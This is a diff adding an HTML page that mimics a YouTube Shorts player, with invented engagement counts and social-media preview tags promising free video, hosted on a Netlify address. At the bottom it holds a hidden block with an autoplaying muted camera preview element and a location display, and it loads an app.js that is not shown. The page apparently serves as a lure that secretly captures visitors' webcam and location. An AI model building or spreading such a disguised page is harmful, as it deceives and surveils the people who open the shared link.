@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Experience</title>
+
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://creative-kitsune-12da5b.netlify.app/">
+    <meta property="og:title" content="Video Experience">
+    <meta property="og:description" content="Watch this amazing video content completely free!">
+    <meta property="og:image" content="https://creative-kitsune-12da5b.netlify.app/thumbnail.png?v=1">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://creative-kitsune-12da5b.netlify.app/">
+    <meta property="twitter:title" content="Video Experience">
+    <meta property="twitter:description" content="Watch this amazing video content completely free!">
+    <meta property="twitter:image" content="https://creative-kitsune-12da5b.netlify.app/thumbnail.png?v=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="main-container">
+        <!-- Video Container -->
+        <div class="video-wrapper">
+            <!-- Main Content Video -->
+            <video id="contentVideo" class="video-player" playsinline loop>
+                <source src="karn.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <!-- YouTube Shorts Desktop UI Overlay -->
+        <div class="shorts-overlay">
+
+            <!-- Top Controls (Desktop Specific) -->
+            <div class="top-controls">
+                <div class="left-controls">
+                    <button id="ppBtn" class="control-btn play-pause-btn">
+                        <!-- Pause Icon (Default as video autoplays) -->
+                        <svg viewBox="0 0 24 24" class="control-icon">
+                            <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" fill="currentColor"></path>
+                        </svg>
+                    </button>
+                    <button id="volBtn" class="control-btn volume-btn">
+                        <svg viewBox="0 0 24 24" class="control-icon">
+                            <path
+                                d="M14,3.23V5.29C16.89,6.15 19,8.83 19,12C19,15.17 16.89,17.84 14,18.7V20.77C18,19.86 21,16.28 21,12C21,7.72 18,4.14 14,3.23M16.5,12C16.5,10.23 15.5,8.71 14,7.97V16.02C15.5,15.29 16.5,13.76 16.5,12M3,9V15H7L12,20V4L7,9H3Z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="right-controls">
+                    <button class="control-btn more-btn">
+                        <svg viewBox="0 0 24 24" class="control-icon">
+                            <path
+                                d="M12,16.5c0.83,0,1.5,0.67,1.5,1.5s-0.67,1.5-1.5,1.5s-1.5-0.67-1.5-1.5S11.17,16.5,12,16.5z M10.5,12 c0,0.83,0.67,1.5,1.5,1.5s1.5-0.67,1.5-1.5s-0.67-1.5-1.5-1.5S10.5,11.17,10.5,12z M10.5,6c0,0.83,0.67,1.5,1.5,1.5 s1.5-0.67,1.5-1.5S12.83,4.5,12,4.5S10.5,5.17,10.5,6z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Right Sidebar Actions -->
+            <div class="actions-sidebar">
+                <div class="action-item">
+                    <div class="icon-circle">
+                        <svg viewBox="0 0 24 24" class="action-icon">
+                            <path
+                                d="M18.77,11h-4.23l1.52-4.94C16.38,5.03,15.54,4,14.38,4c-0.58,0-1.14,0.24-1.52,0.65L7,11H3v10h4h1h8.92 c1.31,0,2.52-0.76,3.02-1.98l2.77-6.63C22.85,12.06,22.48,11,21.56,11C21.42,11,21.16,11,18.77,11z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </div>
+                    <span>105K</span>
+                </div>
+                <div class="action-item">
+                    <div class="icon-circle">
+                        <svg viewBox="0 0 24 24" class="action-icon">
+                            <path
+                                d="M17,4h-1H6.08c-1.31,0-2.52,0.76-3.02,1.98L0.29,12.61C0.15,12.94,0.52,14,1.44,14c0.14,0,0.4,0,2.79,0h4.23l-1.52,4.94 C6.62,19.97,7.46,21,8.62,21c0.58,0,1.14-0.24,1.52-0.65L17,14h4V4H17z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </div>
+                    <span>Dislike</span>
+                </div>
+                <div class="action-item">
+                    <div class="icon-circle">
+                        <svg viewBox="0 0 24 24" class="action-icon">
+                            <!-- Comment Icon -->
+                            <path d="M20,2H4C2.9,2,2,2.9,2,4v18l4-4h14c1.1,0,2-0.9,2-2V4C22,2.9,21.1,2,20,2z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </div>
+                    <span>373</span>
+                </div>
+                <div class="action-item">
+                    <div class="icon-circle">
+                        <svg viewBox="0 0 24 24" class="action-icon">
+                            <path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z" fill="currentColor">
+                            </path>
+                        </svg>
+                    </div>
+                    <span>Share</span>
+                </div>
+
+                <div class="action-item">
+                    <div class="icon-circle">
+                        <!-- Remix Icon -->
+                        <svg viewBox="0 0 24 24" class="action-icon">
+                            <path
+                                d="M12 6v3l4-4-4-4v3c-4.42 0-8 3.58-8 8 0 1.57.46 3.03 1.24 4.26L6.7 14.8c-.45-.83-.7-1.79-.7-2.8 0-3.31 2.69-6 6-6zm6.76 1.74L17.3 9.2c.44.84.7 1.79.7 2.8 0 3.31-2.69 6-6 6v-3l-4 4 4 4v-3c4.42 0 8-3.58 8-8 0-1.57-.46-3.03-1.24-4.26z"
+                                fill="currentColor" />
+                        </svg>
+                    </div>
+                    <span>124</span>
+                    <div class="album-art-small"></div>
+                </div>
+            </div>
+
+            <!-- Bottom Info -->
+            <div class="bottom-info">
+                <div class="promo-badge">
+                    <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:white;margin-right:4px;">
+                        <path
+                            d="M12,2A10,10 0 1,0 22,12,10,10 0 0,0 12,2Zm0,18a8,8 0 1,1 8-8A8,8 0 0,1 12,20ZM11,7h2v6h-2Zm0,8h2v2h-2Z">
+                        </path>
+                    </svg>
+                    Includes paid promotion <span style="margin-left:4px;">›</span>
+                </div>
+
+                <div class="channel-line">
+                    <div class="channel-avatar"></div>
+                    <span class="channel-name">@Virkfamily5</span>
+                    <button class="subscribe-btn">Subscribe</button>
+                    <!-- Added Subscribe button here as per desktop screenshot which often puts sub button on channel line -->
+                </div>
+
+                <div class="video-description">
+                    <p>► Yar chot lag gye hargun</p>
+                </div>
+
+                <div class="metadata-line">
+                    <p>Gye bullet oye😱🥵 / <strong>#shortvideos</strong> <strong>#bullet350</strong>
+                        <strong>#bulletlover</strong> <strong>#bulletstunt</strong> <strong>#shorts</strong>
+                        <strong>#subscribe</strong>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="progress-bar-container">
+                <div class="progress-bar"></div>
+            </div>
+
+            <!-- Local Previews (Hidden) -->
+            <div id="demoArea" class="demo-area hidden" style="display: none;">
+                <video id="camPreview" autoplay playsinline muted></video>
+                <div id="locationDisplay"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
